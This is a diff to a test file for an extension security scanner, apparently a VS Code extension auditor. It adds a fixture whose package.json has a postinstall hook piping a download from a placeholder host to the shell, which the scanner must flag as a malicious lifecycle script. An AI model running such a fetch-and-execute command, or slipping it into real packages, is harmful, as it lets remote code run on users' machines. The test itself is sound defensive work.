@@ -15,12 +15,33 @@ describe("scanExtension", () => {
   const defaultOptions = {
     output: "text" as const,
     severity: "low" as const,
-    network: true,
   };
+
+  it("keeps package checks when the manifest has an unrelated id property", async () => {
+    const root = await mkdtemp(join(tmpdir(), "vsix-manifest-id-"));
+    const manifest = {
+      name: "fixture",
+      publisher: "test",
+      version: "1.0.0",
+      dependencies: { "vscode-darcula": "1.0.0" },
+      scripts: { postinstall: "curl https://example.invalid/script | sh" },
+    };
+    try {
+      for (const extra of [{}, { id: "custom-metadata" }]) {
+        await writeFile(join(root, "package.json"), JSON.stringify({ ...manifest, ...extra }));
+        const result = await scanExtension(root, { ...defaultOptions, modules: ["deps", "intel"] });
+        expect(result.findings.map((finding) => finding.id)).toEqual(
+          expect.arrayContaining(["MALICIOUS_NPM_PACKAGE", "MALICIOUS_LIFECYCLE_SCRIPT"]),
+        );
+      }
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  });
 
   it("throws error for non-existent target", async () => {
     await expect(scanExtension("nonexistent.vsix", defaultOptions)).rejects.toThrow(
-      "Target not found: nonexistent.vsix",
+      "Cannot inspect target nonexistent.vsix",
     );
   });
 
@@ -70,7 +91,7 @@ describe("scanExtension", () => {
     }
   });
 
-  it("supports package submodule filtering and the legacy package alias", async () => {
+  it("supports explicit package check selection", async () => {
     const dir = await mkdtemp(join(tmpdir(), "vsix-audit-submodules-"));
     try {
       await writeFile(
@@ -98,7 +119,10 @@ describe("scanExtension", () => {
       const execution = await scanExtension(dir, { ...defaultOptions, modules: ["execution"] });
       const deps = await scanExtension(dir, { ...defaultOptions, modules: ["deps"] });
       const intel = await scanExtension(dir, { ...defaultOptions, modules: ["intel"] });
-      const legacyPackage = await scanExtension(dir, { ...defaultOptions, modules: ["package"] });
+      const combinedPackage = await scanExtension(dir, {
+        ...defaultOptions,
+        modules: ["manifest", "execution", "deps", "intel"],
+      });
 
       expect(manifest.findings.map((finding) => finding.id)).toContain("ACTIVATION_STARTUP");
       expect(manifest.findings.map((finding) => finding.id)).not.toContain("GITHUB_SHA_EXECUTION");
@@ -112,12 +136,12 @@ describe("scanExtension", () => {
       expect(intel.findings.map((finding) => finding.id)).toContain("MALICIOUS_NPM_PACKAGE");
       expect(intel.findings.map((finding) => finding.id)).not.toContain("LIFECYCLE_SCRIPT");
 
-      const legacyIds = legacyPackage.findings.map((finding) => finding.id);
-      expect(legacyIds).toEqual(expect.arrayContaining(["ACTIVATION_STARTUP"]));
-      expect(legacyIds).toEqual(expect.arrayContaining(["GITHUB_SHA_EXECUTION"]));
-      expect(legacyIds).toEqual(expect.arrayContaining(["LIFECYCLE_SCRIPT"]));
-      expect(legacyIds).toEqual(expect.arrayContaining(["MALICIOUS_NPM_PACKAGE"]));
-      expect(legacyPackage.inventory.map((entry) => entry.name)).toEqual([
+      const combinedIds = combinedPackage.findings.map((finding) => finding.id);
+      expect(combinedIds).toEqual(expect.arrayContaining(["ACTIVATION_STARTUP"]));
+      expect(combinedIds).toEqual(expect.arrayContaining(["GITHUB_SHA_EXECUTION"]));
+      expect(combinedIds).toEqual(expect.arrayContaining(["LIFECYCLE_SCRIPT"]));
+      expect(combinedIds).toEqual(expect.arrayContaining(["MALICIOUS_NPM_PACKAGE"]));
+      expect(combinedPackage.inventory.map((entry) => entry.name)).toEqual([
         "Manifest",
         "Execution",
         "Deps",
